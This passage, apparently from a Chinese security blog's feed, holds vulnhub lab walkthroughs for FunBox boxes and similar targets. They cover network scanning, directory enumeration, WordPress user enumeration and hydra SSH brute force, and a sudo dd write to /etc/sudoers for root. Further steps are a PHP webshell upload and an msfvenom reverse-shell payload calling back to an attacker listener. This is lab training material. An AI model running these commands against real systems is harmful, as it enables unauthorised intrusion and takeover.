variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505210650840.png" alt="image-20240505210650840"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">我们探测出来IP地址为192.168.2.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505211214614.png" alt="image-20240505211214614"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">开启了80端口,服务为Apache2开启了22端口，服务为ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过端口我们可以知道，又是ssh登录</p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.8/">http://192.168.2.8</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505211508157.png" alt="image-20240505211508157"></p><p>可以看到是一个apache2页面</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描网站结构"><a href="#1-nikto扫描网站结构" class="headerlink" title="1)nikto扫描网站结构"></a>1)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.2.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505211735325.png" alt="image-20240505211735325"></p><p>扫描到一个robots.txt敏感目录</p><h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里IP地址变为192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.2.9 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505212342222.png" alt="image-20240505212342222"></p><p>扫描出来一个<a href="http://192.168.2.9/drupal">http://192.168.2.9/drupal</a></p><h3 id="3-dirb扫描"><a href="#3-dirb扫描" class="headerlink" title="3)dirb扫描"></a>3)dirb扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505212903776.png" alt="image-20240505212903776"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问robots-txt"><a href="#1-访问robots-txt" class="headerlink" title="1)访问robots.txt"></a>1)访问robots.txt</h3><p><a href="http://192.168.2.9/robots.txt">http://192.168.2.9/robots.txt</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505213108046.png" alt="image-20240505213108046"></p><p><a href="http://192.168.2.9/Thinking">http://192.168.2.9/Thinking</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505213143759.png" alt="image-20240505213143759"></p><p>没有任何有用的信息</p><h3 id="2-访问drupal目录"><a href="#2-访问drupal目录" class="headerlink" title="2)访问drupal目录"></a>2)访问drupal目录</h3><p><a href="http://192.168.2.9/drupal">http://192.168.2.9/drupal</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505213436812.png" alt="image-20240505213436812"></p><p>我们发现重定向了192.168.178.33，没有什么用，我们进行扫描drupal试试</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/./../imgs/$%7Bfiilename%7D/image-20240505214734508.png" alt="image-20240505214734508"></h3><p>我们可以看到cms是wordpress，那么我们使用wpscan进行爆破，因为开启了22端口，我们可以进行ssh登录</p><h3 id="3-wpscan爆破"><a href="#3-wpscan爆破" class="headerlink" title="3)wpscan爆破"></a>3)wpscan爆破</h3><p>wpscan –url <a href="http://192.168.2.9/drupal/index.php">http://192.168.2.9/drupal/index.php</a> –wp-content-dir&#x3D;<a href="http://192.168.2.8/drupal/wp-content/">http://192.168.2.8/drupal/wp-content/</a> -e</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505215430043.png" alt="image-20240505215430043"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">我们可以看到爆破出来2个用户名，一个是admin,一个是ben<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-hydra爆破"><a href="#4-hydra爆破" class="headerlink" title="4)hydra爆破"></a>4)hydra爆破</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span>  /usr/share/wordlists/rockyou.txt  ssh://192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505215553186.png" alt="image-20240505215553186"></p><p>我们可以看到爆破不出来，那么我们爆破另一个</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> ben <span class="token parameter variable">-P</span>  /usr/share/wordlists/rockyou.txt  ssh://192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505215603591.png" alt="image-20240505215603591"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破出来密码是pookie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ben@192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505215848216.png" alt="image-20240505215848216"></p><p>我们可以看到登录成功</p><p>我们在根目录下可以看到mail目录，但是里面的文件我们没有权限查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505220022514.png" alt="image-20240505220022514"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505221052245.png" alt="image-20240505221052245"></p><p>提权也提权不了,我们换一个思路</p><h3 id="6-邮件服务"><a href="#6-邮件服务" class="headerlink" title="6)邮件服务"></a>6)邮件服务</h3><p>发现 ben 用户在 mail 组中 会不会有邮件发服务呢 netstart -anpt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505220408960.png" alt="image-20240505220408960"></p><p>我们可以看到110端口是开放的吗,我们使用110端口进行查看</p><p>现存在邮件服务 通过110端口 连接本地 telnet 127.0.0.1 110发现可以, 而且有三封信 发现账号密码：adam&#x2F;qwedsayxc!</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505220805479.png" alt="image-20240505220805479"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505220859984.png" alt="image-20240505220859984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505220915396.png" alt="image-20240505220915396"></p><p>我们使用adam进行登录</p><p>ssh <a href="mailto:&#97;&#x64;&#97;&#x6d;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#46;&#57;">&#97;&#x64;&#97;&#x6d;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#46;&#57;</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505221713112.png" alt="image-20240505221713112"></p><p>我们可以看到登录成功</p><h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7)提权"></a>7)提权</h3><p>切换用户查看权限 id发现在sudo组 查看sudo -l发现了dd，de，df都可以sudo提权 只有dd可以使用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505221921830.png" alt="image-20240505221921830"></p><p>提权方法查询网站：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505221959108.png" alt="image-20240505221959108"></p><p>该命令可以写入具有root权限的文件，执行命令进行写入文件&#x2F;etc&#x2F;sudoers，设置adam用户具有全部的特权命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">LFILE</span><span class="token operator">=</span>/etc/sudoers<span class="token builtin class-name">echo</span> <span class="token string">"adam    ALL=(ALL:ALL) ALL"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">dd</span> <span class="token assign-left variable">of</span><span class="token operator">=</span><span class="token variable">$LFILE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505222138478.png" alt="image-20240505222138478"></p><p>可以使用find命令进行提权，提权成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505222232759.png" alt="image-20240505222232759"></p><p>获取flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505222354615.png" alt="image-20240505222354615"></p><p>至此获取到了所有得flag，渗透测试结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBOX-4</title>
    <link href="http://ms02423.top/2024/05/02/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBoX-4/"/>
    <id>http://ms02423.top/2024/05/02/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBoX-4/</id>
    <published>2024-05-02T11:35:12.000Z</published>
    <updated>2024-05-16T14:36:26.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Groundhog <span class="token keyword">Day</span><span class="token punctuation">:</span> Boot2Root !<span class="token keyword">Initial</span> footstep <span class="token keyword">is</span> a <span class="token keyword">bit</span> flowed<span class="token punctuation">,</span> but really <span class="token operator">not</span> difficult<span class="token punctuation">.</span><span class="token keyword">After</span> getting <span class="token keyword">access</span> <span class="token keyword">to</span> Funbox<span class="token punctuation">:</span> CTF<span class="token punctuation">,</span> its nessesarry <span class="token keyword">to</span> find<span class="token punctuation">,</span> <span class="token keyword">read</span> <span class="token operator">and</span> understand the <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">and</span> easy <span class="token keyword">to</span> find<span class="token punctuation">)</span> hints<span class="token punctuation">.</span>Be smart <span class="token operator">and</span> combine<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Hints<span class="token punctuation">:</span> Nikto scans <span class="token string">"case sensitive"</span> <span class="token operator">and</span> you need a minimum <span class="token keyword">of</span> <span class="token number">15</span> mins <span class="token keyword">to</span> get user !<span class="token keyword">If</span> you need hints<span class="token punctuation">,</span> <span class="token keyword">call</span> me <span class="token keyword">on</span> twitter<span class="token punctuation">:</span> @0815R2d2Have fun<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMwareThis works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这里的提示:记得区分大小写</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502194038115.png" alt="image-20240502194038115"></p><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-ctf,546/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502194202203.png" alt="image-20240502194202203"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502194303879.png" alt="image-20240502194303879"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">我们不知道靶场ip地址，但是我们知道靶场的网段是192.168.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场的真实ip地址"><a href="#1-寻找靶场的真实ip地址" class="headerlink" title="1.寻找靶场的真实ip地址"></a>1.寻找靶场的真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502194540146.png" alt="image-20240502194540146"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan-l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502194820352.png" alt="image-20240502194820352"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过上面的两个命令，我们知道靶场真实ip地址是192.168.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502195048147.png" alt="image-20240502195048147"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口，服务是ssh服务发现开启了<span class="token number">80</span>端口，服务是Apache2<span class="token punctuation">.</span><span class="token number">4.18</span>发现开启了<span class="token number">110</span>端口，服务是pop3d发现开启了<span class="token number">143</span>端口，服务是imapd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.13/">http://192.168.2.13</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502195353225.png" alt="image-20240502195353225"></p><p>是一个apache2页面</p><p><a href="http://192.168.2.13:110/">http://192.168.2.13:110</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502195447790.png" alt="image-20240502195447790"></p><p><a href="http://192.168.2.13:143/">http://192.168.2.13:143</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502195502119.png" alt="image-20240502195502119"></p><p>发现网站已被限制</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502195737328.png" alt="image-20240502195737328"></p><h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.2.13 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502200139386.png" alt="image-20240502200139386"></p><h3 id="3-dirb扫描"><a href="#3-dirb扫描" class="headerlink" title="3)dirb扫描"></a>3)dirb扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502200152843.png" alt="image-20240502200152843"></p><p>3个命令我们都没有扫描到如何有用的信息，我们换一个思路搜索</p><h3 id="4-爬虫协议"><a href="#4-爬虫协议" class="headerlink" title="4)爬虫协议"></a>4)爬虫协议</h3><p>我们试试爬虫协议</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">robots.txt是一个文本文件，用于指示搜索引擎爬虫（如Googlebot）如何抓取和索引网站的内容。这个文件位于网站的根目录下，并且包含了一系列指令，告诉爬虫哪些页面可以访问，哪些页面不应该被访问，以及爬虫的抓取频率等信息。robots.txt文件的作用在于帮助网站管理员控制搜索引擎爬虫对网站内容的访问和索引，以优化搜索引擎的抓取效率，同时也可以保护一些敏感信息或不想被搜索引擎索引的内容。robots.txt文件的格式相对简单，它由若干行组成，每行包含一个指令。常见的指令包括：User-agent：指定哪个搜索引擎爬虫应用该规则。Disallow：指示爬虫不应该访问的路径。Allow：允许爬虫访问的路径（在某些情况下）。Crawl-delay：指示爬虫访问网站的时间间隔。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.2.13&#x2F;robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502200505162.png" alt="image-20240502200505162"></p><p>我们看到报错了,题目提示我们注意区分大小写，那么我们使用大写试试</p><p><a href="http://192.168.2.13/ROBOTS.TXT">http://192.168.2.13/ROBOTS.TXT</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502200638255.png" alt="image-20240502200638255"></p><p><a href="http://192.168.2.13/upload">http://192.168.2.13/upload</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502200727436.png" alt="image-20240502200727436"></p><p>还是报错了，我们返回查看源代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502201011266.png" alt="image-20240502201011266"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看源代码发现了igmseklhgmrjmtherij2145236<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1)访问页面"></a>1)访问页面</h3><p><a href="http://192.168.2.13/igmseklhgmrjmtherij2145236/">http://192.168.2.13/igmseklhgmrjmtherij2145236/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502201150454.png" alt="image-20240502201150454"></p><p>我们看到报错了，那么我们进行扫描试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502202154868.png" alt="image-20240502202154868"></p><p>我们扫描到upload.php页面,进行访问</p><h3 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2)文件上传"></a>2)文件上传</h3><p><a href="http://192.168.2.13/igmseklhgmrjmtherij2145236/upload.php">http://192.168.2.13/igmseklhgmrjmtherij2145236/upload.php</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502202238942.png" alt="image-20240502202238942"></p><p><a href="http://192.168.2.13/igmseklhgmrjmtherij2145236/upload/MS02423.php">http://192.168.2.13/igmseklhgmrjmtherij2145236/upload/MS02423.php</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502204324631.png" alt="image-20240502204324631"></p><p>我们可以看到上传成功，我们连接蚁剑试试</p><h3 id="3-连接蚁剑"><a href="#3-连接蚁剑" class="headerlink" title="3)连接蚁剑"></a>3)连接蚁剑</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502202528926.png" alt="image-20240502202528926"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502204455833.png" alt="image-20240502204455833"></p><p>我们发现蚁剑连接成功</p><h3 id="4-解密"><a href="#4-解密" class="headerlink" title="4)解密"></a>4)解密</h3><p>我们查看根目录，可以看到一个hint.txt文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502205058317.png" alt="image-20240502205058317"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502205521276.png" alt="image-20240502205521276"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502205551861.png" alt="image-20240502205551861"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502205632043.png" alt="image-20240502205632043"></p><p>但是其实这些虽然成功解码，没什么价值，是作者故意留的一些陷阱。下一步将已经得到的shell升级到meterpreter,不过本靶机特殊的是，靶机上没有wget, curl等工具，可以用upload.php页面来上传文件</p><h3 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5)反弹shell"></a>5)反弹shell</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span>  linux/x86/meterpreter/reverse_tcp  <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.2.14 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> MS02423.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们上传到蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502211424606.png" alt="image-20240502211424606"></p><p>我们修改MS02423.elf权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502211723929.png" alt="image-20240502211723929"></p><p>同时在Kali Linux启动handler, 等待目标主机的连接。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240502214901319.png" alt="image-20240502214901319"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>FunBox-3</title>
    <link href="http://ms02423.top/2024/04/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-3/"/>
    <id>http://ms02423.top/2024/04/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-3/</id>
    <published>2024-04-28T11:28:16.000Z</published>
    <updated>2024-04-29T14:00:05.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Boot2Root ! Easy going<span class="token punctuation">,</span> but <span class="token keyword">with</span> this Funbox you have <span class="token keyword">to</span> spend a <span class="token keyword">bit</span> more <span class="token keyword">time</span><span class="token punctuation">.</span> Much more<span class="token punctuation">,</span> <span class="token keyword">if</span> you stuck <span class="token keyword">in</span> good traps<span class="token punctuation">.</span> But most <span class="token keyword">of</span> the traps have hints<span class="token punctuation">,</span> that they <span class="token keyword">are</span> traps<span class="token punctuation">.</span><span class="token keyword">If</span> you need hints<span class="token punctuation">,</span> <span class="token keyword">call</span> me <span class="token keyword">on</span> twitter<span class="token punctuation">:</span> @0815R2d2Have fun<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMwareThis works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-easy,526/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428193308105.png" alt="image-20240428193308105"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428204405594.png" alt="image-20240428204405594"></p><p>我们不知道靶场的ip地址，但是我们知道靶场网段是192.168.2.0</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-探测靶场真实ip地址"><a href="#1-探测靶场真实ip地址" class="headerlink" title="1.探测靶场真实ip地址"></a>1.探测靶场真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428204631868.png" alt="image-20240428204631868"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428204742404.png" alt="image-20240428204742404"></p><p>通过上面2个命令,我们知道靶场真实ip地址为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428205105580.png" alt="image-20240428205105580"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">探测发现22端口，服务为ssh探测发现80端口，服务为apache2探测发现33060端口，服务为mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428205644873.png" alt="image-20240428205644873"></p><p>访问发现是一个apache2页面</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428205945043.png" alt="image-20240428205945043"></p><p>还是一个apache2页面</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428210218507.png" alt="image-20240428210218507"></p><p>扫描到4个敏感信息，我们进行一一访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/admin<span 